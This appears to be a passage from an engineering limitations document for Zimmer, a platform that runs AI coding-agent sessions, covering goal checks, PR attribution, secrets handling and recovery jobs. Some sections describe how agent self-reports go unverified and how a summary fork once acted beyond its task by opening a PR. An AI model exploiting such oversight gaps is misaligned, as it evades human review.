`db:migrate` therefore dumps it empty, which is the design and not drift, so comparing it against
the committed file would fail forever.

`db/cable_schema.rb` is still covered by the load-and-dump half — it must be in the running Active
Record version's canonical dump format — which is the only comparison that means anything for a
schema-only database. What nothing checks is that its *contents* still match what solid_cable
expects after a gem upgrade. `test/migrations/schema_dump_test.rb` scopes its version assertion the
same way, for the same reason.

No issue — the check is scoped correctly, and the residue is a gem-upgrade review step.

### Nothing checks the committed icons still match the master artwork

🟡 Every favicon, PWA icon and apple-touch icon is generated from
`docs/scripts/zimmer-icon-source.jpg` by `npm run icons`, and the *output* is what gets committed.
`test/integration/app_icons_test.rb` checks the committed files exist, are the size they claim, and
are wired into the manifest, the layout and the docs site — but not that re-running the generator
would reproduce them. So editing the master and forgetting to re-run the script, or editing one
generated PNG by hand, passes CI.

The obvious fix — regenerate in CI and diff — is not safe to add: sharp/libvips PNG output is not
byte-stable across versions, so the check would go red on an unrelated dependency bump. Re-run
`npm run icons` and commit whatever it writes whenever the master changes.

---

## Development environment

### The containerized dev env's "manual" path is a single shared stack, not isolated

`.agent-containers/` provides a containerized dev stack (`docker-compose.dev.yml`). The compose file
hardcodes `name: zimmer-dev-local`, so running it directly (`docker compose -f
.agent-containers/docker-compose.dev.yml up`) always uses the **same** Compose project regardless of
which clone you run it from. Two clones started that way collide — they share containers, the
`postgres_data` volume, and the port, and tearing one down (including
`DockerComposeCleanupService` cleaning up a clone) takes the other with it.

Per-session isolation comes only from `.agent-containers/ac.sh`, which passes `-p zimmer-dev-<name>`
to give each session its own project, clone, and dynamic port. That's the path agents and anyone
running several instances in parallel should use; the manual/devcontainer path is for a single
instance. This is a consequence of `DockerComposeCleanupService` deriving the project name purely
from the compose file path (no per-clone input), and isn't worth reworking that inherited service
for — use `ac.sh` when you need isolation.

---

## Product gaps

### Auto-categorization has no feedback loop

[Issue #16](https://github.com/tadasant/zimmer/issues/16): an LLM sorts new sessions into categories.
When you drag a mis-sorted session to the right one, the correction is written to
`sessions.category_id` and nowhere else — the model's original choice, its context, even a timeline
note are all discarded. The next identical session is mis-sorted identically, forever.

### A goal is checked, not enforced

`AgentSessionJob#build_prompt_with_goal` appends the goal's description to the prompt, and the agent
decides when it is done. `GoalCheck` reads back what GitHub can show: the PR is open or merged, CI is
green, the description has a checked `## Verification` section with no unchecked boxes, and the
`ready to merge` label is on. It reports an advisory verdict on the session page, in `get_session` and
in the REST session JSON, and **Outcomes → Goal checks** tallies it over sessions at rest. See
[How a goal is checked](/sessions/goals/#how-a-goal-is-checked).

What it does not do:

- **It does not act.** An `unmet` session is not failed, blocked from archiving, or re-prompted. The
  stop condition is still enforced only by the LLM obeying English, and a session that declares
  victory early is still believed. Failing or blocking was rejected because a wrong enforcement traps
  finished work. A one-time re-prompt was measured against production on 2026-09-13 and not built: in
  two days it would have reached one session, and that session was holding its label back for a
  human. See [Measuring the check](/sessions/goals/#measuring-the-check), which keeps that
  population counted.
- **It cannot see a review, a skill, or proof.** Whether a fresh-eyes review ran, whether `open-pr`
  was used, and whether the screenshots show what they claim are not in GitHub's state. `met` means
  nothing visible contradicts the goal.
- **It reads the description the way this deployment writes one.** A Verification heading and
  Markdown task-list boxes. A repository with no CI reads `unknown` on `ci_green` forever, so its
  verdict never gets past `pending`. A session whose PR Zimmer never recorded (see the next entry)
  reads `unmet` on `pull_request_open` even if the PR exists.
- **It recognises a goal stored as its description only while that text is unchanged.** MCP
  `start_session` stores a goal's description, not its id, and `GoalsConfig.resolve` matches it
  exactly. Edit a goal's description in `config/goals.json` and every session started with the old
  text shows no goal check from then on, with nothing to say why.
- **It only reads PRs the poll pass still visits.** A session archived before its PR's description
  and labels were first read has none recorded, so its Verification and label checks read `unknown`
  for good. Every such session on production came to rest before those fields were fetched at all:
  167 of them, which read `pending` instead of `met`. None has appeared since.
- **A spawned session's PR does not repaint its parent's panel.** A session with no PR of its own is
  judged on the PRs its descendants recorded, and that reading is fresh on every load of the page,
  `get_session` or the REST JSON. The broadcast that repaints the panel fires on the session's own
  changes, so an open parent page shows a child's merge only after a reload.
- **Descendants are read to a bound.** Three generations, and at most 200 sessions under any one
  parent, oldest first. A parent that spawned more than that is judged on its first 200.

### PR ownership is a transcript heuristic, and both ways of being wrong are silent

`GithubPrUrlHook` decides which PRs belong to a session by reading its transcript for evidence that
the session *opened* one: a successful create (`gh pr create`, a POST to the REST
`repos/OWNER/REPO/pulls` endpoint, or an MCP `create_pull_request` tool call), a failed `gh pr
create` that says the branch's PR already
exists, or the agent's own prose claiming it opened a PR on this repo. Everything else — a PR read
with `gh pr view`, a PR URL arriving in a user message or a Zimmer notification — is ignored on
purpose, because recording it is how one session ends up receiving another session's review comments
and merge-conflict alerts.

Heuristics have two failure directions and neither announces itself:

- **Too loose** and a PR gets attributed to a session that had nothing to do with it. The prose path
  is the exposed edge here — an agent that writes "opened the PR at `<url>`" about someone else's
  same-repo PR would be believed. Requiring an inflected verb keeps the common "the open PR:
  `<url>`" reference out, but a genuine first-person claim about someone else's PR is
  indistinguishable from a true one. The shell path has the same shape of edge, narrower since
  [#772](https://github.com/tadasant/zimmer/issues/772): a create is read out of what a command runs
  rather than what it quotes, so `gh pr create` inside a `grep` pattern, an `rg` argument or an
  `echo` is data — and narrower again since
  [#873](https://github.com/tadasant/zimmer/issues/873), which took the lines of a **heredoc body**
  out of the reading and stopped a run of three or more quotes (Python's `"""`) from breaking the
  pairing around them. Two spellings still read as an invocation: an **unquoted** mention (`echo gh
  pr create`, or a `#` comment saying it) and a `\"`-escaped one. A heredoc whose terminator the
  splitter cannot find is read as shell rather than swallowed, so an unterminated or truncated one
  is a third — deliberately, because the alternative loses real creates, which is the failure below.
  All are rarer than the quoted form that #772 was, and erring this way is the same choice that
  keeps a real create behind `timeout`, `until`, `sudo` or `xargs` from being missed.
  [#620](https://github.com/tadasant/zimmer/issues/620) added one more, deliberately: a command that
  runs a create and then something else — `gh pr create …; gh pr view 1 --json url` — no longer lets
  the *second* command's non-zero exit veto the create, because in a shell that exit status was never
  the create's to begin with. So if the create is what failed there, a same-repo URL the rest of the
  line printed can be read as the create's own. Three bounds hold it to a single wrong PR at worst:
  one URL only, the session's own repo unless the create named another, and nothing at all when a PR
  *listing* shared the line. What is left is a single-PR read (`gh pr view <n>`) printing a different
  PR than the failed create would have. The failure it replaces was a *successful* create being
  discarded, recorded nowhere, with every GitHub integration silently off for that session.
  `GithubCommentAuthorshipHook` reads its own posting commands the same way since
  [#870](https://github.com/tadasant/zimmer/issues/870), and the same spellings are its
  residual edge, on top of the `gh api` endpoint path it reads as written.
- **Too tight** and a session's own PR is never recorded, so `Github::PrPollPass` and all three of
  its evaluators quietly do nothing for it. A PR
  opened through a path the hook can't see — the web UI, a wrapper script, an MCP tool whose name is
  not `create_pull_request` — and never mentioned in the agent's prose lands here. The shapes are
  enumerated, so each new one costs a session before it is recognised: the REST fallback agents reach
  for when GitHub's GraphQL API is down took session
  [5679](https://zimmer.tadasant.com/sessions/5679) to discover, and the GitHub MCP route was
  structurally invisible until [#559](https://github.com/tadasant/zimmer/issues/559). Four edges
  remain on the MCP tier now that it exists. It is held to the session's own repo on both ends — the
  repo the call's input names, when it names one, and the repo the URL belongs to — so an MCP create
  against a *different* repository records nothing, where the same create through `gh pr create
  --repo other/proj` would; that asymmetry is deliberate, because the tool name is a convention
  matched across servers whose semantics Zimmer has not verified. It records only the **first**
  same-repo URL in a create's result, since one create opens one PR and a result that serializes the
  created PR back carries whatever other pull requests its `body` cites — so a server that printed a
  cited PR ahead of the one it created would record the wrong one. "A failed create is not evidence"
  holds only as far as the runtime says a call failed, and on Codex nothing does: an exit code comes
  from an `exec_command_end` line that only a shell call gets, so an MCP result there always reads as
  a success, and a failed create whose error text quotes a same-repo PR URL would be recorded. And Pi
  sessions are not covered at all: the `pi-mcp-adapter` extension calls every server through one
  `mcp` proxy tool rather than by name, so there is no `mcp__<server>__create_pull_request` in a Pi
  transcript to key on.

**#620's fix does not reach inside a multi-line `bash -lc "…"` wrapper.** `ShellSegments` splits the
outer script on newlines *before* it unwraps the wrapper, so a wrapper whose quoted script spans
lines leaves both lines with unresolved quoting; they fall back to the crude split, which reports no
separators, and the failure flag is then read as written — vetoing the create. The same script
written unwrapped across two lines is read correctly. This matters most on **Codex**, which writes
every command as `bash -lc "…"`, so it is the shape most likely to reproduce #620 there. Pre-existing
and not a regression: before #620 nothing on any runtime read the flag per command.

**A create the hook reads perfectly well is still lost when it lands in a transcript file Zimmer is
not reading.** Session [7619](https://zimmer.tadasant.com/sessions/7619) is the worked case, and it
is the half of [#620](https://github.com/tadasant/zimmer/issues/620) that #620's own fix did not
reach. Zimmer recorded no PR for it, even though
[PR #616](https://github.com/tadasant/zimmer/pull/616) was opened with an ordinary
`gh pr create --repo tadasant/zimmer …` whose result was a clean success carrying the URL — evidence
the Created tier would have taken instantly. The create is in `d608fcfe-….jsonl`, a file whose first
421 lines are byte-identical to 7619's own transcript and whose remaining 177 carry a different
session id.

**That file is a [status-summary fork](/sessions/status-summary/) of 7619, and the cause is gone.**
Line 427 of it is `SessionStatusSummaryGenerator`'s fork prompt verbatim ("Write the Status panel
for this Zimmer session (#7619)"), line 433 is an automated recovery nudge, and everything after is
the fork continuing the conversation it had been handed a copy of — including the create. That is
[#695](https://github.com/tadasant/zimmer/issues/695) exactly, fixed on 2026-09-02: a summary fork
now refuses any turn whose prompt is not the summary request, so it can no longer act as the session
it copied. 7619's own transcript kept being written until 21:34, an hour and a half after the fork
stopped; the two were separate sessions in separate clones, not one conversation Zimmer lost track
of.

What [#1047](https://github.com/tadasant/zimmer/issues/1047) changed is the identity rule that let
the shape go unnoticed: transcript selection is no longer by filename alone, so a file that opens
with this session's conversation and re-keys **inside the session's own transcript directory** is
followed rather than abandoned — and one owned by another `Session` row, which is what a fork is, is
excluded rather than adopted. See
[a re-keyed transcript](/sessions/transcripts/#a-re-keyed-transcript-and-why-the-name-is-only-a-preference).
Neither reaches across clone directories: a transcript directory is a pure function of the working
directory Zimmer recorded, so a copy written from another cwd is outside every directory the poller
looks in, and enumerating `~/.claude/projects/*` on every poll of every session is not a trade worth
making for it. A PR opened by a session other than the one holding the work is still recorded
against the session that opened it, which is correct and is not the same thing as being recorded
against the session a human is watching.

The warning log a PR-flavored goal gets when a session comes to rest (`pause`, `fail` or `archive`)
covers the second case only, and only when the goal happens to mention pull requests. There is no
check at all for the first. That warning is also written once per session and never retracted, so a
session that was warned and is then resumed or unarchived — `resume` runs from `failed`,
`unarchive_to_*` from `archived` — keeps a warning its later PR made obsolete.

A budget of one warning per session means the pause that spends it decides where in the session's
life the warning lands, and `pause` therefore skips a **recovery pause** — see
[which pauses announce themselves](/sessions/lifecycle/#which-pauses-announce-themselves). Every
*other* early pause still spends it: a session that hands back to its human at minute six, then goes
on to open a PR through a route the hook cannot see, keeps a warning written before the PR existed
and gets no second one. That is narrower than [#558](https://github.com/tadasant/zimmer/issues/558)
was — the interrupt pause is the one that carried no information *and* told nobody, since it fires
no wake and sends no push — but it is the same shape, and re-warning on later PR-shaped work is the
part that is not implemented.

A fork is read from **one past** `metadata["forked_at_message_index"]`, because everything at or
before that index — the index is inclusive — is a copy of the source session's conversation and
shows the *source* opening PRs. Two edges come with that. The fork point is a message index into the
fork's own stored transcript, which holds only as long as that transcript stays a prefix-stable
append — the same assumption `broadcast_message_count` makes, and one a runtime that reshaped its
history on resume would break silently, in the too-tight direction. Nothing in the repo breaks it
today: Claude appends to the file, `AgentSessionJob#write_transcript_to_clone` re-materializes
`session.transcript` verbatim when a clone is recreated, and `#carryover_prefix` re-attaches the
stored head across a Codex rollout rotation. And the trim only governs what is written from here on: **a fork credited before this
shipped keeps the list it was given**, because the hook adds URLs and never removes them. Such a
fork stays in all three pollers' scope for the source's PRs until it is archived or failed.

Narrowed in [#214](https://github.com/tadasant/zimmer/issues/214) and
[#556](https://github.com/tadasant/zimmer/issues/556), widened in
[#89](https://github.com/tadasant/zimmer/issues/89).

---

## The Parameter Store resolver has never talked to Google

`SecretProviders` puts a Google Parameter Manager + Secret Manager link at the front of the
`${VAR}` resolution chain, and `docs/operate/secrets-parameter-store.md` gives the exact
provisioning runbook for the credential it needs. **No Zimmer process has ever made the call.**

The GCP half is provisioned for both environments — `zimmer-secrets-prod` and
`zimmer-secrets-staging`, each with its own service account, its three roles, audited, and
production with a canary parameter proven to `:render` — but a human did all of it, and no agent in
this deployment could have: there is no `gcloud` on the box, no GCP MCP server in the catalog, and
CI holds no IAM-admin credential.

The Kamal delivery of `ZIMMER_PARAMS_*` is wired here now for **both** environments
(`.kamal/secrets.*`, `config/deploy.*.yml`, and for staging the `env:` allowlist in
`deploy-staging.yml` too), and the env-file round trip is verified for real. What remains is
human steps that no test can stand in for. For production, two of them, both in
`tadasant-internal`: setting `PROD_ZIMMER_PARAMS_RESOLVER_SERVICE_ACCOUNT_KEY_JSON`, and naming it
in **both** places `zimmer-deploy-prod.yml` enumerates secrets. Miss the second and the Kamal
mapping resolves to blank with no error — a deploy that looks healthy while the store never turns
on. For staging, two, gating different deploy paths rather than stacking: adding
`STAGING_ZIMMER_PARAMS_RESOLVER_SERVICE_ACCOUNT_KEY_JSON` to this repo's Actions secrets, which is
what `deploy-staging.yml` needs; and giving `tadasant-internal`'s staging cutover workflow its own
`env:` passthrough and its own copy of the secret, which nothing here can see or assert. Staging's
`zimmer-secrets-staging` project is provisioned and audited, and `deploy-staging.yml` prints
whether the credential arrived.

What *is* verified here: the chain and its precedence, the degraded state when no credential is
configured, the miss-vs-outage distinction, the snapshot cache semantics, the envelope round-trip
(the envelope the Connectors page hands you is exactly what the client reads back), the fact that
a secret value never lands in a Parameter Manager payload, and that a base64 credential survives
Kamal's escaping into a container while pretty-printed key JSON does not. The Google half is
`test/support/fake_parameter_store.rb`, an in-memory fake of the two APIs behind the HTTP seam —
the production client is what runs, only the network is faked.

So: the code is ready, and wherever the credential is absent Zimmer resolves every `${VAR}` from
encrypted credentials exactly as before. What no test covers is the one thing that matters — a
live `:render` issued by Zimmer itself against real Google. The Connectors page is where that first
shows, in either environment.

---

## The secret namespace is renamed in code, and the live data has not moved yet

`ParameterStore::Namespace`'s scope segment is now `secrets` rather than `mcp`, because `GH_TOKEN`
and `OPENROUTER_API_KEY` were never MCP secrets. **The rename shipped; the migration of the live
parameters in `zimmer-secrets-prod` and `zimmer-secrets-staging` has not run.**

That is a designed-for state, not a broken one. `Namespace.read_namespaces` returns both
namespaces, canonical first, and `GcpClient#resolve_all` reads them in one pass — so every secret
keeps resolving from wherever it currently sits, in either order of code deploy and data move. The
reason it had to be built that way is what makes the half-done state hard to see: the chain's
contract is that [a miss is not an error](/operate/secrets-parameter-store/#the-chain-and-its-order),
so a resolver pointed at a namespace the data had not reached would not raise — every store-only
secret would read as **Missing configuration**, on the Connectors page and nowhere else.

Two things are outstanding, and they have an order:

1. **strad's Secrets Console cannot write the new paths yet.** `strad/infra/strad.prod.yaml` in
   `tadasant-internal` pins Zimmer's two store entries to `namespaces: ["/zimmer/production/mcp/"]`
   and `["/zimmer/staging/mcp/"]` with `namespacesStrict: true`, and under strict a path outside
   that list is refused. Both entries have to list the new prefix **as well as** the old one before
   anything writes there. That file belongs to the `strad-production` root.
2. **The migration is run by a human.** `parameter_store:migrate_namespace` (dry run) and
   `…:migrate_namespace!` need a credential with write permission on the store, and Zimmer
   deliberately holds none — the `zimmer-secrets-writer` service account exists but its key is not
   deployed. Shipping the move as a post-deploy job would mean baking an admin key into the image
   to run once, which is the opposite of what the resolver's three read-only roles are for.

Until it runs, the Connectors store banner names the variables still in the pre-rename namespace,
and each variable's `GSM` tooltip names the namespace that answered for it. Dropping the pre-rename
read path is a separate PR, and its precondition is that banner reading empty.

---

## 🔴 The envelope Zimmer tells you to store breaks on any secret containing a quote, brace or newline

**Unfixed, and known.** No issue is filed yet — it is recorded here so it is not rediscovered from
a production symptom.

`SecretsLocation#envelope_json` — the envelope the Connectors page hands you when the Secrets
Console does not administer Zimmer's project, and the same shape written down in
[the runbook](/operate/secrets-parameter-store/#adding-a-secret) —
creates the parameter with `--parameter-format json` and puts the `__REF__` pointer inside a **JSON
string**:

```json
{"path":"/zimmer/production/secrets/static/X","secret":true,"value":"__REF__(\"//secretmanager…\")"}
```

Parameter Manager's `:render` substitutes the secret's **raw bytes** in place of that token, inside
the enclosing string literal. It does not re-escape them. So a value containing a `"`, a `{` or a
newline breaks the JSON it is being pasted into, and Google refuses the render with **`400 injection
detected`** — which `GcpClient#rendered_envelope` re-raises (it swallows only `404`), failing the
whole namespace snapshot, not just that one variable. Every `${VAR}` in the environment stops
resolving from the store at once.

That rules out most real credentials: service-account key JSON, PEM private keys, anything
JSON-shaped. Plain tokens are fine, which is why nothing has surfaced — everything stored under
the namespaces the resolver reads is a plain token today.

**The reason no test catches it** is the more important half. `FakeParameterStore#render_version`
parses the envelope, replaces the value on the *parsed Ruby object*, and re-serializes with
`JSON.generate` — which correctly re-escapes anything. Structural substitution that Google rejects
therefore round-trips cleanly through the fake, for every possible value. The fake models the
`:render` join but not its validation, so the suite is green on inputs that fail against real
Google. Zimmer inherited both the envelope and the blind spot from strad, where the same defect
surfaced as a real production failure on an 802-byte JSON array containing 88 double-quotes.

**The READ half of this is now closed; the WRITE half is not.** strad's Secrets Console solved it
by storing a secret's bytes base64url — alphabet `[A-Za-z0-9_-]`, nothing a detector can have an
opinion about — and declaring `"encoding":"base64url"` in the envelope. `GcpClient` honours that
field ([#999](https://github.com/tadasant/zimmer/issues/999)), so a value seeded through the console
resolves correctly whatever bytes it carries, and the fake now models a console-written parameter
so the round trip is covered. Three things still are not:

1. **`ParameterStore::WriteClient` writes literal bytes and declares no encoding**, so the Inference
   page's Pi tab and `SecretsLocation#envelope_json` both still create the parameter this section
   describes. A value carrying JSON structure written that way still 400s every `:render`, and
   `ManagedSecret#write` reports the failed verify as *"the store refused the write"* — which is
   false: the write landed, and nothing rolls it back.
2. **`NamespaceMigration` refuses rather than mis-copying.** It reads decoded values and can only
   write literal ones, so a variable whose pre-rename envelope declares an encoding is reported as
   `:unsupported_encoding` and left in place; re-seed it at the canonical path through the console.
   The migration therefore cannot finish on its own for console-written values.
3. **The fake still does not model `:render`'s validation**, so the blind spot above is unchanged
   for anything that reaches `:render` with structural bytes.

## A store value that is not valid UTF-8 is refused

`GcpClient` decodes a `base64url` envelope and then requires the result to be valid UTF-8, refusing
it otherwise — the name reads as `Unresolved` and the Connectors banner lists it under *Held but not
served*.

This is a deliberate narrowing rather than an oversight: a `${VAR}` becomes an environment variable,
and Zimmer handles those as UTF-8 strings throughout — `ParameterStore::Resolver.from_env` already
switches the whole store off rather than serve bytes that are not. A genuinely binary credential
(raw key material, a PKCS#12 blob) therefore cannot be carried by this store, and would need the
chain to grow a bytes-shaped path first.

---

## Connector status is configuration, not reachability

The Connectors page reads the same inputs a session spawn reads — a server's `${VAR}` values,
whether an OAuth flow applies, and the stored credential. It never contacts the MCP server itself.

A **Ready** badge therefore means "Zimmer has what it needs to connect", not "the remote host
answered". A server whose token is valid but whose host is down still reads Ready. Adding a real
reachability probe would mean an outbound request per server on every page view, against
third-party endpoints, on a page that exists to be glanced at.

---

## Authorizing from the Connectors page does not release a session parked on that server

The **Authorize** button on a connector row starts an OAuth flow with no session behind it. That
is the point — you no longer have to spin up a throwaway session to authorize a connector — but it
also means there is no session to resume, so `McpOauthResumeService` never runs for that flow.

If a session is sitting `failed` with `failure_reason: oauth_required` on the very server you just
authorized from `/connectors`, the credential is stored and every future spawn inherits it, but
that session stays parked. Releasing it still takes a click on its own OAuth banner, which takes
the already-have-a-credential branch: re-inject the token, clear the runtime's needs-auth cache,
and resume.

---

## The spot gate decides on a reading up to 15 minutes old — 75 for a spare

The gate compares each window's utilization against its target, and that utilization is the average of
the last `ClaudeAccountQuotaSnapshot` on file for every account in the pool. `ClaudeUsageSamplerJob`
refreshes the serving account every 15 minutes, and each tick also re-reads up to two other accounts
whose newest reading has aged past an hour — so a spare's contribution is at most 75 minutes old,
against a serving account's 15. Between samples the gate is deciding on numbers that may already have
moved, in either direction.

That 75 minutes is a steady-state bound, and three things sit outside it.

An account in **`needs_reauth`** is never probed at all: Zimmer cannot authenticate as it, so its last
reading stands until a human re-authenticates — and it is still averaged into the pool, because its
window is really draining while it waits. The same goes for an account whose token has expired with no
refresh token.

A **pool larger than eleven accounts** — the serving one plus ten spares — cannot keep every spare
inside the bound, because a spare re-probed every five ticks at two probes a tick is ten spares' worth
of budget. Past that size the guarantee degrades toward round-robin: staleness grows with the pool
instead of probes bursting in one tick. **The tick after a gap** behaves the same way: a deploy, a
queue backlog or several accounts added at once leaves every spare stale simultaneously, and the sweep
drains them a budget at a time rather than all at once.

And a spare whose probe keeps **failing** writes no reading, so it stays eligible and is retried each
tick — that is deliberate, since an account whose token starts working again has no other way back
into the average. It means the honest per-day ceiling on this job is the per-tick budget (one serving
probe plus at most four spare attempts, so 480/day) rather than the `96 + 24(N-1)` a pool of N costs
while its probes answer.

Both bounds are knobs, set as deploy environment rather than on the box:
`CLAUDE_SPARE_SAMPLE_MAX_STALENESS_MINUTES` and `CLAUDE_SPARE_SAMPLE_MAX_PROBES_PER_TICK`.

Two consequences worth knowing:

- **A burst can overshoot the target before the reading catches up.** Ten sessions started at once
  spend for up to fifteen minutes against a utilization figure taken before any of them existed. The
  concurrency limit is what bounds the damage — it is the reason the limit exists — but the target is
  a level the deployment crosses and then stops at, not a line it never passes.
- **A session counts against the limit only once it is `running`,** which happens after its clone and
  spawn. A burst that evaluates before any of it has started reads the same fleet size and can
  briefly exceed the limit. The next evaluation corrects it, and the jitter on a held session's
  re-check spreads the backlog out, but the limit is enforced per decision rather than held as a
  reservation.

---

## The gate decides on the pool, but a session spends against one account

The gate averages every account's utilization (`ClaudeAccountPool`), while a session that starts
spends against whichever account is serving. `AccountRotationService` moves to a spare when the
serving account is **refused** — roughly, at 100% or a rejected status — not when it reaches the 80%
target. So a pool comfortably under target can still start a session onto an account with nothing
left, which is answered by a refusal and a rotation rather than by the gate.

That is the intended trade. Deciding on the serving account alone meant one account at its cap held
the whole fleet while the rest of the pool sat idle, which is not what the pool is for. The cost is
that "under 80%" is a statement about the deployment's total headroom, not a promise about the next
session's first API call.

A second consequence: an account in `needs_reauth` is averaged in, so its headroom counts toward
running work Zimmer cannot yet route to it. That is deliberate — the window keeps draining while the
account waits for a human, and treating it as spent would make the pool figure lurch every time an
account dropped out — but a pool where most accounts need re-authentication will read roomier than
the accounts actually serving.

---

## `active_session_count` on quota snapshots has no reader

`QuotaSnapshotService` records the running-session count on every snapshot, and nothing reads it:
`ClaudeUsageRateService`, which divided utilization by session-hours, was deleted with the forecast.
The column is kept because it can only be captured at write time — a reading taken today cannot be
attributed to a fleet size tomorrow — so it remains available as history for any future metric. It is
dead weight until then.

---

## A held spot session has exactly one thread back to life

`SpotSessionHold` defers by re-enqueueing `AgentSessionJob` with a delay, and that single delayed
GoodJob row is the *only* thing that ever restarts the session. GoodJob persists it, so it survives
a worker restart or a deploy — but if it is discarded (retries exhausted on an unrelated exception,
a manual queue purge, a failed deserialization), the session sits in `waiting` indefinitely with a
banner whose "next check" time is permanently in the past. `DeploymentRecoveryJob` will not pick it
up: that only claims sessions carrying `metadata["paused_by"] == "recovery"`, which a held session
does not have.

`SpotHoldSweepJob` is what closes it — the sweep for `waiting` sessions whose `spot_hold_retry_at`
is well past that this entry used to ask for. What remains is latency, not permanence: the backoff
on consecutive holds widens the window in which a broken chain goes unnoticed, so a session pinned
at the one-hour ceiling can be up to an hour past its promised re-check before `spot_hold_retry_at`
says so, plus `SpotSessionHold::OVERDUE_GRACE` and a sweep tick on top.

---

## Pulling a held turn forward cannot see a job that is mid-execution

`Sessions::StartNow` is the one owner of "start this waiting session now", and its whole job is to
avoid a second turn: a held session's turn is already queued on a delayed `AgentSessionJob`, so it
**reschedules** that job rather than enqueuing another. It finds the job with
`finished_at: nil, performed_at: nil` — and that second clause is the gap. A job a worker has just
picked up but which has not yet moved the session out of `waiting` (it is still inside the archived,
pause and gate guards, with `session_id` still blank) reads as *nothing queued*, so a session that
has never run falls to the enqueue branch and can end up with two turns.

`AgentSessionJob`'s concurrency guard covers the overlap while the first job holds `running_job_id`;
nothing covers the case where it has already let go. The window is milliseconds wide per session and
the guard is real, so a single **Start now** or a single promotion almost never hits it.

What changed the shape of the risk rather than the risk itself is
[#423](https://github.com/tadasant/zimmer/issues/423): a trigger's scheduling-class change now
releases every session it promotes, so the same mechanism is pointed at a whole backlog at once —
and the population it is aimed at is exactly the one where dozens of `AgentSessionJob`s are cycling
through the gate continuously. The chance that at least one of *N* sessions sits in that window
scales with *N*. Closing it properly means `StartNow` reading a job that is on a worker as *a turn
is coming* rather than as *nothing is queued*, which is a change to the meaning of its queue read,
not a guard.

---

## A stranded `waiting` session is only rescued if it never started

`StalledStartSweepJob` closes the case that stranded production session 10426 for three days: a
session created, queued, and then left in `waiting` because the one `AgentSessionJob` carrying its
first turn was lost. Its population is deliberately narrow — `waiting`, no `session_id`, a prompt to
run, nothing queued in GoodJob, none of the markers that mean "asleep on purpose" — because that is
the one shape whose repair is unambiguous: run the job creation would have run.

Three neighbours are **not** covered.

- **A session that has already run.** With a `session_id` there is a conversation and a clone, so
  re-running the start job would re-clone underneath it. Those come back through
  `metadata["paused_by"] = "recovery"` and the two recovery sweeps — and a session that reaches
  `waiting` without that marker and without a hold, a pause, a park or an armed wake is stranded
  with nothing looking for it. `Session#continue_nudge_on_refresh?` is the manual door: a human
  pressing **Refresh** sends it the continue nudge.
- **A session with no prompt.** That is not a lost job: `POST /api/v1/sessions` enqueues nothing
  when the caller sends no prompt, deliberately, and the session waits in `waiting` for a follow-up.
  Starting one would run an agent nobody asked for. (A clone-only session created in the web UI is
  a different thing again — `SessionsController` creates it `needs_input`, so it is out of the
  population by status. A clone-only setup job that is lost is not repaired by anything.)
- **The enqueue itself.** The attachment-copy failure paths in `SessionsController#quick_prompt`
  and `#chat_bubble` create the session with `skip_enqueue: true` and then raise before reaching
  `AgentSessionJob.enqueue_new_session`. The human gets a flash message and the row is now rescued
  within ~10 minutes rather than never — but the honest fix is for the create to be undone, or the
  enqueue to happen, on that path.

A turn this sweep restarts **does** carry its attachments, and that is worth stating because it does
not come for free: `AgentSessionJob` receives images and files only as job arguments, and the
replacement job is built from scratch rather than inherited. `Sessions::StartNow` — which is also
what the Ranked view's **Start** entry and a promote to priority use — re-reads them from the durable
volume, where they sit keyed by session id, and the session's log line names what the turn is
carrying. Two things are deliberately left out of that replay: an image whose media type cannot be
sniffed from its own bytes, which is dropped rather than guessed at, and any attachment a **queued
follow-up** already owns — both kinds live in the same per-session directory, so a screenshot
attached to a message somebody queued for later is not smuggled onto the turn before it.

The session page's **Restart from scratch** button is a different door, and it carries them too. It,
`POST /api/v1/sessions/:id/restart` and MCP `action_session`'s `restart` all run
`Sessions::RestartFromScratch`, which clears `session_id` and builds the replacement job itself
rather than going through `Sessions::StartNow`, and reads `Sessions::FirstTurnAttachments` before it
enqueues ([#746](https://github.com/tadasant/zimmer/issues/746)). Replaying is deliberate rather than
incidental: a restart from scratch throws the conversation away and re-runs the session's *original*
prompt, so the attachments that turn was created with are exactly what the replacement turn needs.
The read never raises — this is a path taken only when something has already gone wrong, and a
storage tree that cannot be read costs the attachments, never the restart.

Two recovery paths reach the same reader ([#789](https://github.com/tadasant/zimmer/issues/789)).
`SpotSessionHold`'s stalled-hold re-arm builds a first turn from nothing whenever the hold it repairs
was a deferred *start* on a session with no `session_id`, and now carries that turn's attachments
across with its prompt — which is what its log line had been claiming. `McpOauthResumeService`
replays the stored prompt once the last OAuth flow completes, and carries them too, but only when the
session's transcript is still empty. That gate is the one asymmetry with the restart doors, and it is
load-bearing: `oauth_required` is a `PRE_PROMPT_FAILURE_REASONS` member, yet it is also set on
sessions that have run for hours — by **Edit MCP servers** and **Edit plugins** when a human adds an
OAuth server mid-run, by `AgentSessionJob`'s follow-up branch, and by its post-spawn MCP-failure
classifier. On such a session "everything on the volume" includes attachments earlier turns already
consumed, so replaying them would put the first turn's screenshot on a much later one. The resume
Zimmer re-queues for one of those sessions picks the existing conversation back up rather than
replaying the prompt, so there is no turn there to put an attachment on in any case.

A re-armed spot-hold **resume** recovers its attachments from the other direction: it must not read
the volume, because on a resume the volume holds every attachment the session has ever received, so
the descriptors `hold!` was handed are written onto the hold record beside the prompt and replayed
from there ([#890](https://github.com/tadasant/zimmer/issues/890)). What that does not reach is a
hold recorded before those keys existed, which comes back with its prompt and without its
attachments exactly as it did — the same shape as a pre-`spot_hold_prompt` hold coming back on a
recovery nudge, and it drains as the stranded population does. Nor does it reach a descriptor whose
bytes have since been reaped off the volume: the replay confirms each file is still there and drops
the ones that are not, because handing the adapter a path that is gone fails the *spawn* rather than
costing an attachment, and a repair path must not be able to do more damage than the thing it
repairs.

The `start` branch's refusal to read the volume for a session that has already run costs one narrow
case, named rather than hidden. `McpOauthResumeService` gates its own attachment replay on a blank
*transcript* rather than a blank `session_id`, so it can put attachments on a new-session job for a
session that already has one; a held-then-lost job of exactly that shape is re-armed without them.
Its population is the intersection of four unlikely things, and reading the volume to cover it would
mis-attach on every other session that has run — the trade
[#789](https://github.com/tadasant/zimmer/issues/789) already made.

The prompt half of that gap is closed: a follow-up blocked on OAuth used to be dropped entirely,
because it existed only as its job's argument and the resume re-queued the session's *original*
prompt instead. The gate now hands the undelivered prompt back to the session as
`pending_follow_up_prompt` and the resume delivers that turn rather than replaying the first one
([#887](https://github.com/tadasant/zimmer/issues/887), and
[which prompt the resume delivers](/auth/mcp-oauth/#which-prompt-the-resume-delivers)). What it
still does not carry is that follow-up's *own* attachments — they were job arguments too, and
